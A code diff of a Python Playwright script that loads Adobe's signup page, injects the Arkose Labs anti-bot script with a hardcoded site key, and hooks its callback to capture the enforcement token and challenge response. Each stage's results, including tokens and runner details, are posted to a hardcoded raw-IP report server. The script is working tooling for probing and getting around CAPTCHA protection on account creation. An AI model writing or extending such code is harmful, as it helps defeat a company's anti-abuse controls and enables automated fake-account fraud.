@@ -4,6 +4,7 @@ import subprocess
 
 REPORT_URL = 'http://23.148.228.38:8001/report'
 SITEKEY = '436DD567-5435-4B14-89A6-2F1188E11334'
+CBNAME = 'setupEnforcementCompleteAccount'
 
 def report(data):
     try:
@@ -30,7 +31,7 @@ async def main():
     except Exception:
         pass
     info['runner'] = runner
-    report({'stage':'ark_started','n': n, **info})
+    report({'stage':'a2_started','n': n, **info})
     try:
         from playwright.async_api import async_playwright
         async with async_playwright() as p:
@@ -42,41 +43,42 @@ async def main():
             pg.on('request', lambda r: reqs.append((r.method, r.url[:250])))
             await pg.goto('https://auth.services.adobe.com/de_DE/deeplink.html?deeplink=signup&locale=de_DE#/signup', wait_until='domcontentloaded', timeout=60000)
             await pg.wait_for_timeout(4000)
-            await pg.add_script_tag(url=f'https://adobe-api.arkoselabs.com/v2/{SITEKEY}/api.js')
-            await pg.wait_for_timeout(3000)
-            env = await pg.evaluate('typeof window.ArkoseEnforcement')
-            report({'stage':'ark_env','env':env,'n': n, **info})
-            result = await pg.evaluate('''async (sk) => {
-                const out = {done: false};
-                return new Promise((resolve) => {
+            await pg.evaluate('''(cbName) => {
+                window.__ark_result = {};
+                window[cbName] = function(enforcement) {
+                    window.__ark_result.enforcement = true;
                     try {
-                        const enc = new window.ArkoseEnforcement({public_key: sk});
-                        let timer = setTimeout(() => { out.done = true; out.timeout = true; resolve(out); }, 40000);
-                        enc.setConfig({
+                        enforcement.setConfig({
                             onCompleted: (resp) => {
-                                out.done = true;
-                                out.token = (resp && resp.token || '').slice(0, 120);
-                                out.respKeys = resp ? Object.keys(resp).slice(0,20) : [];
-                                out.resp = JSON.stringify(resp).slice(0, 400);
-                                clearTimeout(timer); resolve(out);
+                                window.__ark_result.done = true;
+                                window.__ark_result.token = (resp && resp.token || '').slice(0,150);
+                                window.__ark_result.resp = JSON.stringify(resp).slice(0,500);
                             },
                             onError: (e) => {
-                                out.done = true; out.error = JSON.stringify(e).slice(0,300);
-                                clearTimeout(timer); resolve(out);
+                                window.__ark_result.done = true;
+                                window.__ark_result.error = JSON.stringify(e).slice(0,300);
                             },
-                            onReady: () => { out.ready = true; },
-                            onShown: () => { out.shown = true; }
+                            onReady: () => { window.__ark_result.ready = true; },
+                            onShown: () => { window.__ark_result.shown = true; }
                         });
-                        enc.run();
-                    } catch(e) { out.done = true; out.exc = String(e).slice(0,200); resolve(out); }
-                });
-            }''', SITEKEY)
-            report({'stage':'ark_result','res':result,'n': n, **info})
+                        enforcement.run();
+                    } catch(e) { window.__ark_result.exc = String(e).slice(0,200); }
+                };
+            }''', CBNAME)
+            await pg.add_script_tag(url=f'https://adobe-api.arkoselabs.com/v2/{SITEKEY}/api.js?dataCallback={CBNAME}')
+            await pg.wait_for_timeout(2000)
+            for _ in range(20):
+                await asyncio.sleep(2)
+                r = await pg.evaluate('window.__ark_result')
+                if r.get('done') or r.get('exc'):
+                    break
+            r = await pg.evaluate('window.__ark_result')
+            report({'stage':'a2_result','res':r,'n': n, **info})
             hit = [u for m,u in reqs if 'arkoselabs' in u or 'arks-client' in u or 'arkose' in u]
-            report({'stage':'ark_reqs','reqs':hit[:25],'n': n, **info})
+            report({'stage':'a2_reqs','reqs':hit[:25],'n': n, **info})
             await b.close()
     except Exception as e:
-        report({'stage':'ark_exception','err':str(e)[:200],'n': n, **info})
+        report({'stage':'a2_exception','err':str(e)[:200],'n': n, **info})
         traceback.print_exc()
 
 asyncio.run(main())
